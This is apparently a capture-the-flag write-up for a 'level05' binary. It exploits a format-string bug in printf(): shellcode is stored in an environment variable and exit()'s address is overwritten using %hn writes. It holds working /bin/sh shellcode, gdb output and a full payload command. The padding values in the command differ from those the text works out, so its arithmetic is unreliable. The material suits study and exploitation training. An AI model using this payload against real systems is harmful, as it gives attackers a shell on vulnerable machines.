Decompiling with Hex-Rays on https://dogbolt.org/ shows three things:
- the program converts input from uppercase to lowercase, if it's part of the ASCII table
- a format string attack is possible because of an unsafe `printf()` call
- the program ends with a call to `exit()`.

Our solution will consist of storing a shellcode inside an environment variable and overwrite `exit()` with its address. We need to export the shellcode, otherwise any values corresponding to an uppercase letter in ASCII will be modified by the program. So the goal is to use the `%n` specifier, with which we will send the address of the environment variable as a decimal number and store it inside the `exit()` call.

First, let's export our shellcode:
```Shell
export SHELLCODE=`python -c 'print("\x90" * 10 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'`
```

Now, let's retrieve the address of a random NOP instruction inside our environment variable:
```Shell
(gdb)  x/s *((char **)environ)
0xffffd8d6: "SHELLCODE=1\311\367\341\260\vQh//shh/bin\211\343Í€"    
```

Writing the address in one go is impossible because it exceeds the capacity of an `int`, therefore crashing `%d` and `%n` (as `%n` takes an `*int` as argument). We are forced to divide it and store each part in a `short int`, aka `%hn`.
So our payload will consist in:
[first two bytes of the address of `exit()`] + [last two bytes of the address of `exit()`] (reversed to little endian)
and then
%[last bytes of the address of our shellcode in decimal]d + %[the index on the stack]$hn + %[first bytes of the address of our shellcode in decimal]d + %[the index on the stack]$hn
```Shell
(python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55492d" + "%10$hn" + "%10035d" + "%11$hn")'; cat) | ./level05
```

Let's take a deeper look at the values we provide for the address of the NOP instruction.
The address is 0xffffd8d6, which gives us, in decimal:
ffff = 65535 / d8d6 = 55510
Since we're in little endian, we start with `d8d6`, minus 8 (because of the 8 bytes of the address of `exit()`): 55502.
Then, for `ffff` minus 8 and minus 55502, so we get: 10025.
We will place each value next to each other on the stack, therefore they will be placed at index 10 and index 11, respectively.
